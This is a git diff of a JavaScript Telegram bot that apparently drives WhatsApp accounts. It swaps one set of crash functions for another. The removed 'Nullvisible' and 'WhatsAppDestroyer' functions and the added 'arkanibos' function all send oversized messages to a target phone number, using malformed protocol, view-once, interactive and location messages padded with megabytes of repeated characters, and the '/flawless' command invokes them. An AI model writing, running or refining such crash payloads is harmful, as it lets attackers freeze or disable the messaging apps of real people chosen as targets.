@@ -351,325 +351,55 @@ async function connectToWhatsApp(botNumber, chatId) {
     return sock;
 }
 
-async function Nullvisible(sock, target) {
-    try {
-        let phoneNumber = target.replace(/\D/g, '');
-        
-        if (!phoneNumber.startsWith('62') && !phoneNumber.startsWith('1')) {
-            phoneNumber = '62' + phoneNumber;
-        }
-
-        if (phoneNumber.startsWith('0')) {
-            phoneNumber = '62' + phoneNumber.substring(1);
-        }
-
-        const jid = `${phoneNumber}@s.whatsapp.net`;
-        
-        const persistentPayload = {
-            viewOnceMessageV2: {
-                message: {
-                    messageContextInfo: {
-                        deviceListMetadata: {
-                            senderKeyHash: Buffer.alloc(100000),
-                            senderTimestamp: "0".repeat(100000),
-                            recipientKeyHash: Buffer.alloc(100000)
-                        },
-                        messageSecret: Buffer.alloc(50000)
-                    },
-                    extendedTextMessage: {
-                        text: " ".repeat(500000),
-                        contextInfo: {
-                            expiration: 0,
-                            ephemeralExpiration: 604800,
-                            disappearingMode: {
-                                initiator: "INITIATOR_SYSTEM",
-                                trigger: "MANUAL_CHAT_SETTING"
-                            },
-                            quotedAd: {
-                                adContent: "A".repeat(100000),
-                                adId: "B".repeat(50000)
-                            }
-                        }
-                    }
-                }
-            }
-        };
-
-        const memoryLeakPayload = {
-            protocolMessage: {
-                key: {
-                    remoteJid: jid,
-                    fromMe: false,
-                    id: "0".repeat(100000)
-                },
-                type: 15,
-                historySyncNotification: {
-                    fileSha256: Buffer.alloc(100000),
-                    fileLength: "9999999999",
-                    mediaKey: Buffer.alloc(50000),
-                    fileEncSha256: Buffer.alloc(100000),
-                    directPath: "C".repeat(50000)
-                }
-            }
-        };
-
-        const renderBugPayload = {
-            interactiveMessage: {
-                body: {
-                    text: "D".repeat(250000)
-                },
-                nativeFlowMessage: {
-                    buttons: [
-                        {
-                            name: "invisible_chat",
-                            buttonParamsJson: "E".repeat(100000)
-                        }
-                    ]
-                },
-                header: {
-                    title: "F".repeat(50000),
-                    subtitle: "G".repeat(50000)
-                },
-                contextInfo: {
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: jid
-                    },
-                    messageAddOnDurationInSecs: 31536000
-                }
-            }
-        };
-
-        for (let hour = 0; hour < 24; hour++) {
-            for (let batch = 0; batch < 6; batch++) {
-                try {
-                    await sock.relayMessage(jid, persistentPayload, {
-                        participant: { jid: jid },
-                        messageId: `NULL_${Date.now()}_${hour}_${batch}`
-                    });
-
-                    await sock.relayMessage(jid, memoryLeakPayload, {
-                        participant: { jid: jid },
-                        messageId: `MEMORY_${Date.now()}_${hour}_${batch}`
-                    });
-
-                    await sock.relayMessage(jid, renderBugPayload, {
-                        participant: { jid: jid },
-                        messageId: `RENDER_${Date.now()}_${hour}_${batch}`
-                    });
-
-                    await new Promise(resolve => setTimeout(resolve, 10000));
-
-                } catch (error) {
-                    continue;
-                }
-            }
-            
-            console.log(`Invisible chat maintained for ${hour + 1} hours`);
-            await new Promise(resolve => setTimeout(resolve, 600000));
-        }
-
-        return true;
-        
-    } catch (error) {
-        console.error('Error in Nullvisible:', error);
-        throw error;
-    }
-}
-
-async function WhatsAppDestroyer(sock, target) {
-    try {
-        let phoneNumber = target.replace(/\D/g, '');
-        
-        if (!phoneNumber.startsWith('62') && !phoneNumber.startsWith('1')) {
-            phoneNumber = '62' + phoneNumber;
-        }
-
-        if (phoneNumber.startsWith('0')) {
-            phoneNumber = '62' + phoneNumber.substring(1);
-        }
-
-        const jid = `${phoneNumber}@s.whatsapp.net`;
-        
-        const forceClosePayloads = [
-            {
-                protocolMessage: {
-                    key: {
-                        remoteJid: jid,
-                        fromMe: false,
-                        id: "0".repeat(1000000)
-                    },
-                    type: 14,
-                    ephemeralExpiration: 0,
-                    ephemeralSettingTimestamp: "1".repeat(1000000)
-                }
-            },
-            {
-                viewOnceMessageV2: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {
-                                senderKeyHash: Buffer.alloc(2000000),
-                                senderTimestamp: "2".repeat(2000000),
-                                recipientKeyHash: Buffer.alloc(2000000)
-                            },
-                            messageSecret: Buffer.alloc(1000000)
-                        },
-                        extendedTextMessage: {
-                            text: "3".repeat(2000000),
-                            contextInfo: {
-                                expiration: 999999999,
-                                ephemeralExpiration: 999999999,
-                                disappearingMode: {
-                                    initiator: "INITIATOR_SYSTEM",
-                                    trigger: "MANUAL_CHAT_SETTING"
-                                }
-                            }
-                        }
-                    }
-                }
-            },
-            {
-                interactiveMessage: {
-                    body: {
-                        text: "4".repeat(1000000)
-                    },
-                    nativeFlowMessage: {
-                        buttons: [
-                            {
-                                name: "crash_app",
-                                buttonParamsJson: "5".repeat(1000000)
-                            }
-                        ]
-                    },
-                    header: {
-                        title: "6".repeat(500000),
-                        subtitle: "7".repeat(500000)
-                    }
-                }
-            },
-            {
+async function arkanibos(sock, target) {
+const test = "ꦾ".repeat(20000);
+const crot = "\u0018".repeat(20000);
+  try {
+    const arkaganteng = {
+      viewOnceMessage: {
+        message: {
+          liveLocationMessage: {
+            degreesLatitude: 0,
+            degreesLongitude: 0,
+            caption: "ﾑ尺ズﾑ Wのﾘ" + test,
+            accuracyInMeters: 3,
+            sequenceNumber: 1,
+            timeOffset: Date.now(),
+            contextInfo: {
+              externalAdReply: {
+                title: "woy tunduk ke arka",
+                body: test,
+                thumbnailUrl: "https://picsum.photos/400/200",
+                sourceUrl: https://${test}.crash.arka.com/${test}/${test}/${test}/,
+                mediaType: 1,
+                renderLargerThumbnail: true,
+              },
+              quotedMessage: {
                 ephemeralMessage: {
-                    message: {
-                        conversation: "8".repeat(2000000),
-                        messageContextInfo: {
-                            deviceListMetadata: {
-                                senderKeyHash: Buffer.alloc(1500000),
-                                recipientKeyHash: Buffer.alloc(1500000)
-                            }
-                        }
-                    }
-                }
-            }
-        ];
-
-        const invisibleChatPayloads = [
-            {
-                protocolMessage: {
-                    key: {
-                        remoteJid: jid,
-                        fromMe: false,
-                        id: "9".repeat(500000)
+                  message: {
+                    locationMessage: {
+                      degreesLatitude: 0,
+                      degreesLongitude: 0,
+                      name: crot,
+                      address: crot,
+                      url: https://${test}.crash.arka.com/${test}/${test}/${test}/,
                     },
-                    type: 15,
-                    historySyncNotification: {
-                        fileSha256: Buffer.alloc(1000000),
-                        fileLength: "9999999999",
-                        mediaKey: Buffer.alloc(500000),
-                        fileEncSha256: Buffer.alloc(1000000),
-                        directPath: "A".repeat(500000)
-                    }
-                }
-            },
-            {
-                viewOnceMessage: {
-                    message: {
-                        interactiveResponseMessage: {
-                            body: {
-                                text: "B".repeat(500000),
-                                format: "DEFAULT"
-                            },
-                            nativeFlowResponseMessage: {
-                                name: "call_permission_request",
-                                paramsJson: "C".repeat(1000000),
-                                version: 3
-                            }
-                        }
-                    }
-                }
-            }
-        ];
-
-        for (let i = 0; i < 100; i++) {
-            for (const payload of forceClosePayloads) {
-                try {
-                    await sock.relayMessage(jid, payload, {
-                        participant: { jid: jid },
-                        messageId: `DESTROY_${Date.now()}_${i}`
-                    });
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                } catch (error) {
-                    continue;
-                }
-            }
-
-            for (const payload of invisibleChatPayloads) {
-                try {
-                    await sock.relayMessage(jid, payload, {
-                        participant: { jid: jid },
-                        messageId: `INVISIBLE_${Date.now()}_${i}`
-                    });
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                } catch (error) {
-                    continue;
-                }
-            }
-
-            if (i % 10 === 0) {
-                await sock.sendPresenceUpdate('composing', jid);
-                await sock.sendPresenceUpdate('paused', jid);
-            }
-        }
-
-        const mediaBombPayloads = [
-            {
-                image: { 
-                    url: 'data:image/jpeg;base64,' + 'D'.repeat(5000000)
+                  },
                 },
-                caption: "E".repeat(1000000),
-                mimetype: 'image/jpeg'
+              },
             },
-            {
-                document: { 
-                    url: 'data:application/pdf;base64,' + 'F'.repeat(5000000),
-                    mimetype: 'application/pdf',
-                    fileName: 'G'.repeat(1000) + '.pdf'
-                },
-                caption: "H".repeat(1000000)
-            },
-            {
-                audio: {
-                    url: 'data:audio/mp3;base64,' + 'I'.repeat(5000000)
-                },
-                    mimetype: 'audio/mp3'
-            }
-        ];
+          },
+        },
+      },
+    };
 
-        for (const mediaPayload of mediaBombPayloads) {
-            try {
-                await sock.sendMessage(jid, mediaPayload);
-                await new Promise(resolve => setTimeout(resolve, 100));
-            } catch (error) {
-                continue;
-            }
-        }
-
-        console.log('WhatsAppDestroyer - Complete Destruction Activated');
-        return true;
-        
-    } catch (error) {
-        console.error('Error in WhatsAppDestroyer:', error);
-        throw error;
-    }
+    await sock.relayMessage(target, arkaganteng, {
+      messageId: "suki_meki_" + Date.now(),
+    });
+    console.log("send");
+  } catch (err) {
+    console.error("err:", err);
+  }
 }
 
 bot.onText(/\/addsender/, async (msg) => {
@@ -1429,9 +1159,7 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
             });
         }
 
-        await Nullvisible(sock, target);
-        await sleep(500);
-        await WhatsAppDestroyer(sock, target);
+        await arkanibos(sock, target);
         await sleep(500);
 
         await bot.editMessageCaption(`\`\`\`
